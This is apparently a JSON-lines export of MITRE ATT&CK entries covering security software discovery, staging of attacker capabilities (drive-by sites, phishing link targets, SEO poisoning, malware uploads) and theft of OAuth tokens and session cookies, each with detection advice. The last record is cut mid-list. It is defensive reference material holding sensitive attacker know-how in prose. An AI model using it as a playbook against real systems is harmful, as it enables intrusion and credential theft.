{"ID":"T1518.001","name":"Software Discovery: Security Software Discovery","description":"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)","url":"https://attack.mitre.org/techniques/T1518/001","created":"21 February 2020","last modified":"21 April 2023","version":"1.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1518","defenses bypassed":null,"contributors":"Isif Ibrahima, Mandiant","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Unit 42 Rocke January 2019),(Citation: Palo Alto Comnie),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FoxIT Wocao December 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Korean FSI TA505 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Github PowerShell Empire),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: wardle evilquest parti),(Citation: FireEye APT34 Dec 2017),(Citation: Talos Promethium June 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: KISA Operation Muzabi),(Citation: Microsoft SIR Vol 21),(Citation: ESET Casbaneiro Oct 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Proofpoint Bumblebee April 2022),(Citation: Securelist Darkhotel Aug 2015),(Citation: Zscaler Kasidet),(Citation: McAfee Gold Dragon),(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: ESET PipeMon May 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Cybereason Valak May 2020),(Citation: Security Affairs SILENTTRINITY July 2019),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Unit 42 WhisperGate January 2022),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Baumgartner Naikon 2015),(Citation: jRAT Symantec Aug 2018),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Securelist BlackOasis Oct 2017),(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT28),(Citation: TrendMicro TropicTrooper 2015),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ESET Dukes October 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Microsoft Tasklist),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: Palo Alto T9000 Feb 2016),(Citation: F-Secure CozyDuke),(Citation: Talos Rocke August 2018),(Citation: ATT QakBot April 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Prevailion EvilNum May 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Trend Micro Waterbear December 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: Kaspersky StoneDrill 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Turla),(Citation: Kaspersky Flame),(Citation: Unit 42 VERMIN Jan 2018),(Citation: TechNet Netsh),(Citation: SentinelLabs Metador Sept 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Cylance Shell Crew Feb 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Talos Micropsia June 2017),(Citation: Microsoft DUBNIUM June 2016),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: BlackBerry Bahamut),(Citation: Kaspersky Flame Functionality),(Citation: Cybereason Bazar July 2020),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: TechNet Netsh Firewall),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Talos Frankenstein June 2019),(Citation: ESET ComRAT May 2020),(Citation: ESET RTM Feb 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cybereason Clop Dec 2020),(Citation: DustySky),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Check Point Meteor Aug 2021),(Citation: Cymmetria Patchwork),(Citation: Secureworks GOLD KINGSWOOD September 2018),"}
{"ID":"T1608","name":"Stage Capabilities","description":"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)","url":"https://attack.mitre.org/techniques/T1608","created":"17 March 2021","last modified":"19 October 2022","version":"1.2","tactics":"Resource Development","detection":"If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Proofpoint TA416 Europe March 2022),"}
{"ID":"T1608.004","name":"Stage Capabilities: Drive-by Target","description":"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","url":"https://attack.mitre.org/techniques/T1608/004","created":"17 March 2021","last modified":"15 April 2023","version":"1.3","tactics":"Resource Development","detection":"If infrastructure or patterns in the malicious web content utilized to deliver a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: Talos Transparent Tribe May 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Unit 42 ProjectM March 2016),(Citation: Gallagher 2015),"}
{"ID":"T1608.003","name":"Stage Capabilities: Install Digital Certificate","description":"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).","url":"https://attack.mitre.org/techniques/T1608/003","created":"17 March 2021","last modified":"16 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nDetection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001) or [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1608.005","name":"Stage Capabilities: Link Target","description":"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)","url":"https://attack.mitre.org/techniques/T1608/005","created":"17 March 2021","last modified":"11 April 2023","version":"1.3","tactics":"Resource Development","detection":"If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":"Goldstein Menachem","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Proofpoint TA407 September 2019),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Kaspersky LuminousMoth July 2021),"}
{"ID":"T1608.006","name":"Stage Capabilities: SEO Poisoning","description":"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)\n\nTo help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)","url":"https://attack.mitre.org/techniques/T1608/006","created":"30 September 2022","last modified":"13 March 2023","version":"1.0","tactics":"Resource Development","detection":null,"platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":"Goldstein Menachem; Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Vijay Lalwani; Will Jolliffe; Will Thomas, Equinix Threat Analysis Center (ETAC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1608.001","name":"Stage Capabilities: Upload Malware","description":"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.","url":"https://attack.mitre.org/techniques/T1608/001","created":"17 March 2021","last modified":"11 April 2023","version":"1.2","tactics":"Resource Development","detection":"If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [User Execution](https://attack.mitre.org/techniques/T1204) or [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":"Goldstein Menachem; Kobi Haimovich, CardinalOps","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Unit 42 Gamaredon February 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Korean FSI TA505 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: Lacework TeamTNT May 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),"}
{"ID":"T1608.002","name":"Stage Capabilities: Upload Tool","description":"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.","url":"https://attack.mitre.org/techniques/T1608/002","created":"17 March 2021","last modified":"20 October 2022","version":"1.2","tactics":"Resource Development","detection":"If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1608","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant UNC3890 Aug 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Dell TG-3390),"}
{"ID":"T1528","name":"Steal Application Access Token","description":"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nIn Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  \n\n","url":"https://attack.mitre.org/techniques/T1528","created":"04 September 2019","last modified":"21 April 2022","version":"1.2","tactics":"Credential Access","detection":"Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\n\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\n\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.","platforms":"Azure AD, Containers, Google Workspace, Office 365, SaaS","data sources":"User Account: User Account Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Jen Burns, HubSpot; Mark Wee; Ram Pliskin, Microsoft Azure Security Center; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army); Suzy Schapperle - Microsoft Azure Red Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AADInternals Documentation),(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: Peirates GitHub),(Citation: Kubernetes Hardening Guide)"}
{"ID":"T1539","name":"Steal Web Session Cookie","description":"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.","url":"https://attack.mitre.org/techniques/T1539","created":"08 October 2019","last modified":"28 July 2021","version":"1.2","tactics":"Credential Access","detection":"Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.","platforms":"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","data sources":"File: File Access, Process: Process Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Johann Rehberger; Microsoft Threat Intelligence Center (MSTIC)","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky QakBot September 2021),(Citation: IBM Grandoreiro April 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET EvilNum July 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Kroll Qakbot June 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Prevailion EvilNum May 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Kaspersky TajMahal April 2019),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: 